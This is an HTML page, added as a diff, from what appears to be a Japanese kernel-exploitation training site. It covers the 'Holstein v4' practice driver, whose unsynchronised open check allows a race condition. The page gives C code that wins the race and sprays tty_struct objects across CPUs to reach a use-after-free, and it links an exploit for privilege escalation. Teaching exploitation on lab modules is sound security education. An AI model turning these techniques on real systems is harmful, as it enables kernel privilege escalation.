@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>Holstein v4: Race Condition | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                Holstein v4: Race Condition
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="use_after_free.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p><a href="use_after_free.html">前章</a>ではHolsteinモジュールのUse-after-Freeを悪用して権限昇格をしました。3度目の正直、Holsteinモジュールの開発者は3つ目のパッチでモジュールを修正し、Holstein v4を公開しました。開発者曰くもうこれ以上脆弱性はなく、今後はアップデートも停止するそうです。本章では、最終版のHolsteinモジュールv4をexploitしていきます。</p>
+<div class="column" title="目次">
+<!-- toc -->
+<ul>
+<li><a href="#%E3%83%91%E3%83%83%E3%83%81%E3%81%AE%E8%A7%A3%E6%9E%90">パッチの解析</a></li>
+<li><a href="#race-condition">Race Condition</a>
+<ul>
+<li><a href="#%E7%99%BA%E7%94%9F%E6%9D%A1%E4%BB%B6">発生条件</a></li>
+<li><a href="#%E7%AB%B6%E5%90%88%E3%82%92%E6%88%90%E5%8A%9F%E3%81%95%E3%81%9B%E3%82%8B">競合を成功させる</a></li>
+</ul>
+</li>
+<li><a href="#cpu%E3%81%A8heap-spray">CPUとHeap Spray</a></li>
+<li><a href="#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC">権限昇格</a></li>
+</ul>
+<!-- tocstop -->
+<br>
+</div>
+<h2><span id="パッチの解析">パッチの解析</span></h2>
+<p>最終版v4は<a href="distfiles/LK01-4.tar.gz">ここ</a>からダウンロードできます。まずはv3との差分を見ていきましょう。<br>
+まず起動スクリプト<code>run.sh</code>ですが、マルチコアで動作するように変更されています。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-    -smp 1 \</span></span><br><span class="line"><span class="addition">+    -smp 2 \</span></span><br></pre></td></tr></table></figure>
+<p>プログラムの方は、メモリリークとUse-after-Freeが修正されています。<br>
+1つ目が<code>open</code>で、既に誰かがドライバを開いている際には変数<code>mutex</code>が1になり、<code>open</code>が失敗するように設計されています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> mutex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *g_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">module_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_open called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mutex) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;resource is busy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>つまり、<code>open</code>中に再度ドライバを開くことはできなくなりました。開いているファイルディスクリプタを<code>close</code>すると<code>mutex</code>が0に戻り、再度<code>open</code>可能になります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">module_close</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  mutex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>脆弱性はどこにあるでしょうか？少し考えてみてください。</p>
+<h2><span id="race-condition">Race Condition</span></h2>
+<p>今回のドライバの実装は完璧のように思えるかもしれませんが、実はまだ<strong>複数のプロセスかリソースにアクセスする</strong>という状況を完全に考慮できていません。<br>
+OSは複数のプロセス（スレッド）を同時に実行できるようにコンテキストスイッチを実装し、マルチスレッドで複数のプログラムを動かせるようにプロセスを管理しています。コンテキストスイッチが発生するタイミングは関数のような大きい粒度ではなく、アセンブリの命令単位での切り替え<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>になります。当然、<code>module_open</code>関数の実行中にコンテキストが切り替わる可能性もあるわけです。<br>
+この章では、このようなマルチスレッド・マルチプロセスで発生する<strong>競合</strong>問題(Race Condition)を悪用して、exploitを書いていきます。</p>
+<h3><span id="発生条件">発生条件</span></h3>
+<p>まずは競合状態がどのような結果を生むかを考えます。例えば次のような実行順序でコンテキストが切り替わった場合を考えます。</p>
+<center>
+  <img src="img/race1.png" alt="マルチスレッドでの正しい動作例" style="width:620px;">
+</center>
+<p>初めに<code>mutex</code>には0が入っているのでスレッド1の条件分岐でジャンプが発生し、<code>g_buf</code>を確保するパスに到達します。さらに青色の命令で<code>g_buf</code>にアドレスが入ります。<br>
+次にコンテキストスイッチが発生して実行がスレッド2に切り替わります。スレッド2の段階では<code>mutex</code>に1が入っているため、条件分岐ではジャンプが発生せず、EBUSYを返すパスに到達して<code>open</code>が失敗します。<br>
+したがって、この例では<code>module_open</code>が開発者の期待した通りに動いています。<br>
+次に下の図の実行順序を考えます。</p>
+<center>
+  <img src="img/race2.png" alt="Race Conditionに陥る動作例" style="width:620px;">
+</center>
+<p>先程と同様にスレッド1では<code>g_buf</code>を確保するパスに到達します。しかし、今回は<code>mutex</code>に1を入れる前にコンテキストスイッチが発生します。<br>
+するとスレッド2の条件分岐の段階ではまだ<code>mutex</code>に0が入っているため、<code>g_buf</code>を確保するパスに到達します。そして青色の命令で<code>g_buf</code>に確保されたアドレスが入ります。<br>
+当然その後コンテキストスイッチが発生してスレッド1に実行が切り替わるのですが、スレッド1はバッファを確保して赤色の命令でアドレスを<code>g_buf</code>に保存します。<br>
+すると、どちらのスレッドでも<code>open</code>が成功してしまい、スレッド1が確保したアドレスが両方のスレッドから使える状態になることが分かります。</p>
+<p>このように、カーネル空間のコードを設計する際は、常にマルチスレッドを考慮した設計にしないとバグが起きてしまいます。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="オオカミくん"></div>
+  <p class="says">
+  　変数mutexの読み書きにatomicな演算を使わなかったことが原因で起きた競合だね。
+  </p>
+</div>
+<p><code>open</code>が2回成功すると、片方に対して<code>close</code>が呼ばれても<code>g_buf</code>は解放されたポインタを指したままなので、前章と同様のUse-after-Freeが引き起こせます。</p>
+<h3><span id="競合を成功させる">競合を成功させる</span></h3>
+<p>まずは<code>open</code>の競合が本当に可能かをコードを書いて調べましょう。<br>
+複数のスレッドで<code>open</code>を立て続けに呼べば簡単に競合は起きますが、競合が成功したことを判定しなければループを抜け出せません。競合の判定方法は様々ですが、基本的には2つのスレッドから<code>read</code>して、両方成功すれば競合に成功したと判断する方法が妥当でしょう。また、今回は無駄な<code>read</code>呼び出しを減らすため、ファイルディスクリプタを確認することにしました。というのも、2つのスレッドから<code>open</code>に成功した場合、かならずどちらかのファイルディスクリタは4になるはずです。<br>
+著者は以下のように、同じ関数を2スレッドで動かすことで競合状態を作れるRaceを書きました。もちろんメインスレッドでループしても構いませんし、競合状態の判定方法はみなさんの好きなように設計してください。なお、コンパイルオプションに<code>-lpthread</code>を付けて<code>libpthread</code>をリンクすることを忘れないように注意しましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// どちらかのスレッドでfdが4になるまで競合を試みる</span></span><br><span class="line">    <span class="keyword">while</span> (!win) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">      <span class="keyword">if</span> (fd == <span class="number">4</span>) win = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (win == <span class="number">0</span> &amp;&amp; fd != <span class="number">-1</span>) close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 相手スレッドが偶然行き違いでfdをcloseしていないことを確認</span></span><br><span class="line">    <span class="keyword">if</span> (write(<span class="number">3</span>, <span class="string">&quot;A&quot;</span>, <span class="number">1</span>) != <span class="number">1</span> || write(<span class="number">4</span>, <span class="string">&quot;a&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 失敗</span></span><br><span class="line">      close(<span class="number">3</span>);</span><br><span class="line">      close(<span class="number">4</span>);</span><br><span class="line">      win = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 成功</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> th1, th2;</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;th1, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_create(&amp;th2, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(th1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(th2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">  <span class="keyword">int</span> fd1 = <span class="number">3</span>, fd2 = <span class="number">4</span>;</span><br><span class="line">  write(fd1, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  read(fd2, buf, <span class="number">5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>これでほぼ100%の確率でRaceに成功することが分かります。Race成功までにかかる時間もミリ秒単位で、primitiveとして十分に使えるものになりました。</p>
+<div class="column" title="コラム：競合状態とデータ競合">
+  「競合状態(race condition)」と「データ競合(data race)」は似ている言葉ですが、2つの意味は違いますし、お互いを補完するような並列な言葉でもありません。<br>
+  データ競合とは、メモリ中のある場所のデータを2つのスレッドが同時に（非同期に）アクセスする（少なくとも片方は書き込み）状態を指します。そのため、データ競合は未定義動作を引き起こします。データ競合は適切な排他制御やアトミック演算により解決できます。<br>
+  一方で競合状態は、マルチスレッドの実行順序によって異なる結果が生まれる状態を指します。競合状態はロジックバグなどと同じで「プログラマがそう書いたからそう動いている」だけであり、予期しない動作(unexpected behavior)は起きますが未定義動作(unsound behavior)が起きることとは関係ありません。マルチスレッドによりプログラマの意図に反する結果が生まれれば、そのときは競合状態のバグがあると言えます。<br>
+  今回のドライバには実装ミスによる競合状態があり、バッファのポインタにおけるデータ競合が発生します。
+</div>
+<h2><span id="cpuとheap-spray">CPUとHeap Spray</span></h2>
+<p>今回のようにマルチスレッドで競合のexploitを実装することは多々ありますが、この際に注意が必要なことがあります。<br>
+複数スレッドで競合状態を引き起こしているということは、攻撃時に複数のCPUコアが使われています。すると、当然どちらかのCPUコアから<code>module_open</code>が呼ばれて<code>kzalloc</code>でメモリ領域が確保されます。<br>
+ここで、以前Heap Overflowの章で説明した<a href="heap_overflow#slub%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">SLUBアロケータ</a>の特徴を思い出してみましょう。SLUBアロケータではオブジェクト確保に使うslabをCPUごとのメモリ領域に管理しています。<br>
+つまり、今<code>main</code>関数が動いているスレッドと異なるCPUコアから確保された<code>g_buf</code>が<code>kfree</code>されると、当然確保時のCPUコアに対応するslabにリンクされます。すると、その後で<code>main</code>スレッドからHeap Sprayをしても、<code>kfree</code>された<code>g_buf</code>と被ることはありません。<br>
+したがって、今回のような状況では<strong>複数スレッドでHeap Sprayを走らせる</strong>ように注意しましょう。</p>
+<p>また、<code>/dev/ptmx</code>を開くことで新たにファイルディスクリプタが作られますが、1つのプロセスが作れるファイルディスクリプタの数には限りがるので、大量のsprayが要るときは、sprayがヒットした時点で関係の無いファイルディスクリプタを閉じるといった工夫も必要です。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">spray_thread</span><span class="params">(<span class="keyword">void</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> x;</span><br><span class="line">  <span class="keyword">long</span> spray[<span class="number">800</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++) &#123;</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// tty_structのspray</span></span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        close(spray[j]);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd2, &amp;x, <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) == <span class="keyword">sizeof</span>(<span class="keyword">long</span>) &amp;&amp; x) &#123;</span><br><span class="line">      <span class="comment">// ヒット</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        close(spray[j]);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">void</span>*)spray[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++)</span><br><span class="line">    close(spray[i]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use-after-Freeの作成</span></span><br><span class="line">  close(fd1);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 複数コアでのHeap Spray */</span></span><br><span class="line">  <span class="keyword">long</span> victim_fd = <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// メインスレッドで試す</span></span><br><span class="line">  victim_fd = (<span class="keyword">long</span>)spray_thread(<span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// メインスレッドで失敗したらサブスレッドの結果を利用</span></span><br><span class="line">  <span class="keyword">while</span> (victim_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spraying on another CPU...&quot;</span>);</span><br><span class="line">    pthread_create(&amp;th1, <span class="literal">NULL</span>, spray_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(th1, (<span class="keyword">void</span>*)&amp;victim_fd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="オオカミくん"></div>
+  <p class="says">
+  　sched_setaffinity関数を使うと、スレッドが利用するCPUを制限できるから、コア数が増えても2コアの時と同じような挙動になるよ。
+  </p>
+</div>
+<h2><span id="権限昇格">権限昇格</span></h2>
+<p>あとはこれまで同様の手順で権限昇格するだけです。<br>
+データ競合によりUse-after-Freeを引き起こし、そこにHeap Sprayで<code>tty_struct</code>を載せるという一連の流れを関数にすると、複数回Use-after-Freeを起こすのが簡単に書けます。</p>
+<p>サンプルのexploitは<a href="exploit/race-krop.c">ここ</a>からダウンロードできます。</p>
+<center>
+  <img src="img/race_privesc.png" alt="Race Conditionによる権限昇格" style="width:320px;">
+</center>
+<p>競合状態のexploitはデバッグが難しいため、最初の段階で理論を実現できるかと、高い確率で安定してraceを引き起こすようなprimitiveが作れるかがexploit開発の肝となります。</p>
+<hr>
+<div class="column" title="例題">
+  qemu起動オプションでCPUのコア数を4や8に上げたとき、あなたの書いたexploitのraceやsprayがどの程度の確率で動くかを調べてみましょう。
+  また、失敗確率が高い場合は、コア数に依存せずに高い確率で動くようなexploitに直してみましょう。
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>CPUによっては最適化のために命令の実行順序が変わるといったさらに粒度の低い話もありますが、今回は関係ないので説明しません。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="use_after_free.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
